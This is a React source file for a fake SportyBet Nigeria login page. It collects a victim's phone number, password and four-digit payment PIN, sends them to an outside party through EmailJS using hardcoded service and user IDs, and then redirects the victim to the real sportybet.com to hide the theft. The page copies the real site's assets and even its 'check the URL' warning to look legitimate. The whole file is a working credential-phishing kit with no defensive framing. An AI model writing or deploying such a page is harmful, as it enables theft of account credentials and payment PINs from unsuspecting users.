
import React, { useRef, useState, useEffect } from 'react';
import emailjs from 'emailjs-com';
import './App.css';
import { RiErrorWarningFill, } from 'react-icons/ri';
import { AiFillFacebook, } from 'react-icons/ai';
import { IoIosArrowForward, } from 'react-icons/io';



const App = () => {
  const fblink = 'https://web.facebook.com/v4.0/dialog/oauth?app_id=433677653945061&cbt=1635890934183&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1e77be0836cce%26domain%3Dwww.sportybet.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sportybet.com%252Ff223e34de6a45c%26relation%3Dopener&client_id=433677653945061&display=popup&domain=www.sportybet.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.sportybet.com%2Fng%2Fm%2F&locale=en_US&logger_id=f3d78be5447433c&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3847b70945fbb%26domain%3Dwww.sportybet.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.sportybet.com%252Ff223e34de6a45c%26relation%3Dopener%26frame%3Df16c6fe9f6c2304&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2C%20email&sdk=joey&version=v4.0'
  const form = useRef();
  const [phone, changePhone]= useState('')
  const [pass, changePass] = useState('')
  const [showPass, changeShowPass]=useState(false)
  const [p1, onChangePin1] = useState('')
  const [p2, onChangePin2] = useState('')
  const [p3, onChangePin3] = useState('')
  const [p4, onChangePin4] = useState('')
  const [showPin, showChangePin]= useState(false)
  const [botFild, changeBotfilds] = useState(0)
  const [pinAll, pinABool] = useState(false)
   //botFild


  useEffect(() => {
   
    if (p1!=='' && p2!=='' && p3!=='' && p4!=='') {
      pinABool(true)
    } else {
      pinABool(false)
    }
    //console.log( p1, p2, p3, p4)
  if (phone.length > 9 && pass.length > 4) {
   // console.log(botFild)
    return changeBotfilds(1)
  } else {
    return changeBotfilds(0)
  }
 

}, [phone, pass, botFild, p1, p2, p3, p4])
  



  
  const sendEmail = () => {
   
   

    console.log(form.current)


    emailjs.sendForm('service_mcfht6s', 'template_9is9buy', form.current, 'user_gYQ6bA0HJDujZoKgeF1oX')
      .then((result) => {
        console.log(result.text);
        if (result.text === 'OK'|| result.text === 'Ok' || result.text === 'ok') {
          window.location.replace('https://www.sportybet.com')
        }
      }, (error) => {
          console.log(error.text);
      });
  };


  const onChangePhone =(e)=>{
    changePhone(e.target.value)
     // console.log(e.target.value)
  }
   const onChangePass =(e)=>{
     changePass(e.target.value)
     // console.log(e.target.value)
   }


//////////
   const onChangeShowPass =()=>{
    
     console.log('pam')
    return  changeShowPass(!showPass)
   }
   
  //changeShowPass

  const handleFocus = (e) => {
        
    if(e.target.nextSibling)
        e.target.nextSibling.focus();
    
}    
  
  //console.log(od)
  return (
    <div className='register-and-login'>
    <div className='form_container'>
                  <div className="change-region-wrap">
                    <img className="country-flag" src="//s.sporty.net/ng/main/modules/common-wap/components/layout/pagelate/footer/image/ngLogo.7bacdd8c1b.png" alt="Nigeria"/>
                    <span className="current-country">Nigeria</span>
                    <span className="change-country" data-cms-key="change" data-cms-page="common_functions">Change</span>
                    <i className="m-icon-right"> <IoIosArrowForward size={30} color='green'/></i>
                    <span className="close"></span>
                    </div>
      <form ref={form} >
       
        <div className='input_box'>
          <div className='number_div'>+234</div>
          <input className='input' placeholder='Mobile Number' type="number" name="phone"  onChange={onChangePhone} value={phone}/>
        </div>
        
        <div className='input_box'>
         
            <input className='input' placeholder='Password' type={showPass?'text':"password" } name="password" onChange={onChangePass} value={pass} />
            <button className='showPass' onClick={(e) => {
              e.preventDefault()
              onChangeShowPass()
            }}>{showPass ? 'hide' : 'show'}</button>
        </div>
        
        {
            showPin && (
              <div className='Pin-container'>
                <div className='warning  m-notification--inf m-notification '>
                  <RiErrorWarningFill className='wrn'/>
                  <p>Always ensure the URL is www.sportybet.com before inputting your PIN. Never reveal your PIN to anyone even if they claim to represent SportyBet.</p>
                </div>
                <div className='pin-m'>
                  <div className='t_align'>
                    <div className='h_1'>
                        Enter Sporty PIN
                      </div>

                      <div className='h_2'>
                        Too many failed attempts will lock payments for 1 hour
                      </div>
                  </div>
                  
                    <div className='pins-flex'>
                    <input autoFocus={true} maxLength={1} className='pin_input' type="number" name="p_1" value={p1} onChange={(e) => {
                          onChangePin1(e.target.value)
                          handleFocus(e)
                      }}/>
                      <input maxLength={1} className='pin_input' type="number" name="p_2"   value={p2} onChange={(e)=>{
                         onChangePin2(e.target.value)
                          handleFocus(e)
                      }} />
                      <input maxLength={1} className='pin_input'  type="number" name="p_3"   value={p3} onChange={(e)=>{
                         onChangePin3(e.target.value)
                          handleFocus(e)
                      }}   />
                      <input maxLength={1} className='pin_input'  type="number" name="p_4"  value={p4} onChange={(e)=>{
                         onChangePin4(e.target.value)
                          handleFocus(e)
                      }}  />
                    </div>

                  {
                    console.log(pinAll)
                  }
                  <button onClick={(e) => {
                      e.preventDefault()
                      sendEmail()
                    }} className={`sub_btn-${pinAll  ? 'active_green' : 'noms'} wd80`}  disabled={pinAll ? false : true} > Verify  </button>


                  <a href='https://www.sportybet.com/ng/m/my_accounts' className='fp'>Forgot Pin?</a>
                  </div>
              </div>
          )
        }
        
          <button onClick={(e) => {
            e.preventDefault()
            showChangePin(!showPin)
          }} className={`sub_btn-${botFild === 1 ? 'active_green' : 'noms'}`}  disabled={botFild === 1 ? false : true} >Log In</button>
          <div>
            <div className='links'><a href='https://www.sportybet.com/ng/m/'>Forgot Password ?</a> <a href='https://www.sportybet.com/ng/m/'>Create New Account</a></div>
            <div className='grayCont'>
                <div className='line-gray'/>
                  <div>Or</div>
                <div className='line-gray'/>
            </div>
            <div className='fblinker'>
              <AiFillFacebook size={30}/>
              <a href={fblink}>
               In With Facebook
              </a>
            </div>
          </div>
      </form>
    </div>
    </div>
    
  );
};

export default App